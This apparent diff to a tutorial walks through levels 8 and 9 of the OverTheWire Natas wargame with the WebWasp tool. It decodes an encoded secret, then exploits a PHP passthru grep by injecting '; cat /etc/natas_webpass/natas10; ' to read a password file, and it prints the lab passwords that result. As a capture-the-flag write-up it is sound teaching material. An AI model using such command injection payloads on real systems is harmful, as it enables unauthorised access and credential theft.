@@ -18,7 +18,8 @@ The intent for this walkthrough is to demonstrate WebWasp's abilities in a "real
 - [Level 5](#level-5) (Cookies! 🍪)
 - [Level 6](#level-6) (Our first POST request)
 - [Level 7](#level-7) (Local File Inclusion Exploit)
-- [Level 8](#level-8)
+- [Level 8](#level-8) (More POST requests)
+- [Level 9](#level-9) (PHP command injection)
 
 ## Level 0
 
@@ -1084,6 +1085,467 @@ If you're curious, you can check out OWASP's entry pertaining to this exploit at
 Let's save that password into `pass8` and move on!
 
 ## Level 8
+
+Let's clear the parameter we set in the last level, update the auth headers, and make our request to level 8!
+
+```HTML
+<html>
+<head>
+-- truncated --
+</head>
+<body>
+<h1>natas8</h1>
+<div id="content">
+
+
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+This looks familiar! We saw this same thing back in level 6! Let's go ahead and fill out are post request parameters just as we did before, then we'll work on finding the secret:
+
+```
+> params add secret 'tmp'
+[🐝] Added param:
+   'secret' : 'tmp'
+> params add submit 'any'
+[🐝] Added param:
+   'submit' : 'any'
+```
+
+Now let's check out the `index-source.html` link:
+
+```
+> get http://natas8.natas.labs.overthewire.org/index-source.html
+[🐝] Sending GET request to http://natas8.natas.labs.overthewire.org/index-source.html?secret=tmp&submit=any...
+[🐝] GET request completed. Status code: 200 (OK)
+[🐝] Response captured! Type 'response show' for summary
+```
+
+We'll run beautify on the response preemptively:
+
+```HTML
+> response beautify 
+[🐝] Beautifying response text...
+   Ran prettify.
+   Made 162 entity decodes.
+> resp show -t
+<code>
+ <span style="color: #000000">
+  <html>
+   <br/>
+   <head>
+    -- truncated
+   </head>
+   <br/>
+   <body>
+    <br/>
+    <h1>
+     natas8
+    </h1>
+    <br/>
+    <div id="content">
+     <br/>
+     <br/>
+     <span style="color: #0000BB">
+      <?<br />
+      <br/>
+      $encodedSecret
+     </span>
+     <span style="color: #007700">
+      =
+     </span>
+     <span style="color: #DD0000">
+      "3d3d516343746d4d6d6c315669563362"
+     </span>
+     <span style="color: #007700">
+      ;
+      <br/>
+      <br/>
+      function
+     </span>
+     <span style="color: #0000BB">
+      encodeSecret
+     </span>
+     <span style="color: #007700">
+      (
+     </span>
+     <span style="color: #0000BB">
+      $secret
+     </span>
+     <span style="color: #007700">
+      ) {
+      <br/>
+      return
+     </span>
+     <span style="color: #0000BB">
+      bin2hex
+     </span>
+     <span style="color: #007700">
+      (
+     </span>
+     <span style="color: #0000BB">
+      strrev
+     </span>
+     <span style="color: #007700">
+      (
+     </span>
+     <span style="color: #0000BB">
+      base64_encode
+     </span>
+     <span style="color: #007700">
+      (
+     </span>
+     <span style="color: #0000BB">
+      $secret
+     </span>
+     <span style="color: #007700">
+      )));
+      <br/>
+      }
+      <br/>
+      <br/>
+      if(
+     </span>
+     <span style="color: #0000BB">
+      array_key_exists
+     </span>
+     <span style="color: #007700">
+      (
+     </span>
+     <span style="color: #DD0000">
+      "submit"
+     </span>
+     <span style="color: #007700">
+      ,
+     </span>
+     <span style="color: #0000BB">
+      $_POST
+     </span>
+     <span style="color: #007700">
+      )) {
+      <br/>
+      if(
+     </span>
+     <span style="color: #0000BB">
+      encodeSecret
+     </span>
+     <span style="color: #007700">
+      (
+     </span>
+     <span style="color: #0000BB">
+      $_POST
+     </span>
+     <span style="color: #007700">
+      [
+     </span>
+     <span style="color: #DD0000">
+      'secret'
+     </span>
+     <span style="color: #007700">
+      ]) ==
+     </span>
+     <span style="color: #0000BB">
+      $encodedSecret
+     </span>
+     <span style="color: #007700">
+      ) {
+      <br/>
+      print
+     </span>
+     <span style="color: #DD0000">
+      "Access granted. The password for natas9 is
+      <censored>
+       "
+      </censored>
+     </span>
+     <span style="color: #007700">
+      ;
+      <br/>
+      } else {
+      <br/>
+      print
+     </span>
+     <span style="color: #DD0000">
+      "Wrong secret"
+     </span>
+     <span style="color: #007700">
+      ;
+      <br/>
+      }
+      <br/>
+      }
+      <br/>
+     </span>
+     <span style="color: #0000BB">
+      ?&gt;
+      <br/>
+     </span>
+     <br/>
+     <form method="post">
+      <br/>
+      Input secret:
+      <input name="secret"/>
+      <br/>
+      <br>
+       <input name="submit" type="submit"/>
+       <br/>
+      </br>
+     </form>
+     <br/>
+     <br/>
+     <div id="viewsource">
+      <a href="index-source.html">
+       View sourcecode
+      </a>
+     </div>
+     <br/>
+    </div>
+    <br/>
+   </body>
+   <br/>
+  </html>
+  <br/>
+ </span>
+</code>
+```
+
+Let's neaten this up a bit:
+```PHP
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+function encodeSecret($secret) {
+   return bin2hex(strrev(base64_encode($secret)));
+}
+```
+
+So it looks like the secret is first base64 encoded, followed by being string reversed, then convert from binary to hex.
+
+WebWasp doesn't have any native functionality for these kinds of operations, but we can exit out of the program and throw this in a unix terminal:
+
+```bash
+$ echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p - | rev | base64 -d
+oubWYf2kBq
+```
+
+This command reverses the operations done to the secret in the PHP function. We won't break this down to much here since it doesn't have much to do with WebWasp, but is a good challenge to look through on your own.
+
+Let's use that secret we decoded in our `secret` parameter:
+
+```
+> params add secret 'oubWYf2kBq'
+[🐝] Added param:
+   'secret' : 'oubWYf2kBq'
+```
+
+and make our post request (don't forget to add the parameter names to the command!):
+
+```
+> post http://natas8.natas.labs.overthewire.org secret submit
+[🐝] Sending POST request to http://natas8.natas.labs.overthewire.org/index-source.html...
+POST request made with parameters:
+   'secret' : 'oubWYf2kBq'
+   'submit' : 'any'
+[🐝] POST request completed. Status code: 200 (OK)
+[🐝] Response captured! Type 'response show' for summary
+```
+
+```HTML
+> resp show -t
+<html>
+<head>
+-- truncated --
+</head>
+<body>
+<h1>natas8</h1>
+<div id="content">
+
+Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Perfect! Very similar from a WebWasp perspective to level 6, just some different encryption mechanisms involved in unlocked the secret!
+
+Save that password in `pass9` and we're off!
+
+## Level 9
+
+Clear those parameters from the last level and make a request to level 9!
+
+```HTML
+<html>
+<head>
+-- truncated --
+</head>
+<body>
+<h1>natas9</h1>
+<div id="content">
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Another `<form>` here, so potentially another POST request to come, as well as the `index-source.html` link we've seen in a few previous levels.
+
+Before we go digging in the source, let's make a POST request to that form.
+
+```
+> params add needle 'random'
+[🐝] Added param:
+   'needle' : 'random'
+> params add submit 'any'   
+[🐝] Added param:
+   'submit' : 'any'
+```
+```HTML
+> post http://natas9.natas.labs.overthewire.org needle submit
+[🐝] Sending POST request to http://natas9.natas.labs.overthewire.org...
+POST request made with parameters:
+   'needle' : 'random'
+   'submit' : 'any'
+[🐝] POST request completed. Status code: 200 (OK)
+[🐝] Response captured! Type 'response show' for summary
+```
+```HTML
+> response show -t
+<html>
+<head>
+-- truncated --
+</head>
+<body>
+<h1>natas9</h1>
+<div id="content">
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+random
+randomly
+randomness
+randomness's
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+It looks like this is doing some sort of text searching within a dictionary-type file. It found words containing the word we put in the `needle` field of the POST request.
+
+Let's take a look at that source now. Remember the `--no-params` flag:
+
+```
+> get http://natas9.natas.labs.overthewire.org/index-source.html --no-params
+```
+```HTML
+> resp show -t
+<pre><br/><span style="color: #0000BB"><?<br />$key </span><span style="color: #007700">= </span><span style="color: #DD0000">""</span><span style="color: #007700">;<br/><br/>if(</span><span style="color: #0000BB">array_key_exists</span><span style="color: #007700">(</span><span style="color: #DD0000">"needle"</span><span style="color: #007700">, </span><span style="color: #0000BB">$_REQUEST</span><span style="color: #007700">)) {<br/>    </span><span style="color: #0000BB">$key </span><span style="color: #007700">= </span><span style="color: #0000BB">$_REQUEST</span><span style="color: #007700">[</span><span style="color: #DD0000">"needle"</span><span style="color: #007700">];<br/>}<br/><br/>if(</span><span style="color: #0000BB">$key </span><span style="color: #007700">!= </span><span style="color: #DD0000">""</span><span style="color: #007700">) {<br/>    </span><span style="color: #0000BB">passthru</span><span style="color: #007700">(</span><span style="color: #DD0000">"grep -i </span><span style="color: #0000BB">$key</span><span style="color: #DD0000"> dictionary.txt"</span><span style="color: #007700">);<br/>}<br/></span><span style="color: #0000BB">?&gt;<br/></span></pre>
+```
+
+Let's run `response beautify` on this, and isolate just the text by running the `response find` command like so:
+
+```PHP
+> response beautify
+   -- truncated --
+> resp find --text
+
+-- truncated --
+$key = "";if(array_key_exists("needle", $_REQUEST)) {    $key = $_REQUEST["needle"];}if($key != "") {    passthru("grep -i $key dictionary.txt");}?>
+-- truncated --
+```
+
+This looks like the main operational code behind the scenes. It's looking through a file called `dictionary.txt` using the `grep` command.
+
+The main snippet of interest here is:
+
+```
+"grep -i $key dictionary.txt"
+```
+
+It's taking the input we pass to the `needle` field and placing it directly into a `grep` command! Very bad practice, and this should ring some alarm bells in some hacker's minds out there!
+
+What this is vulnerable to is a basic command injection. We can perform this in a variety of ways, but let's structure it like this:
+
+```bash
+grep -i ; cat /etc/natas_webpass/natas10; dictionary.txt
+```
+
+We inject the semicolons and the `cat` command, so that it reads the password for the next level off the system!
+
+```
+> params add needle "; cat /etc/natas_webpass/natas10; "
+[🐝] Added param:
+   'needle' : '; cat /etc/natas_webpass/natas10; '
+```
+
+```
+> post http://natas9.natas.labs.overthewire.org needle submit               
+[🐝] Sending POST request to http://natas9.natas.labs.overthewire.org...
+POST request made with parameters:
+   'needle' : '; cat /etc/natas_webpass/natas10; '
+   'submit' : 'any'
+[🐝] POST request completed. Status code: 200 (OK)
+[🐝] Response captured! Type 'response show' for summary
+```
+
+```HTML
+> resp show -t
+<html>
+<head>
+-- truncated --
+</head>
+<body>
+<h1>natas9</h1>
+<div id="content">
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+And there we go! In place of the `grep` command's output, we injected a `bash` command to instead `cat` the file we wanted.
+
+Copy that into `pass10`!
+
+## Level 10
 
 ---
 
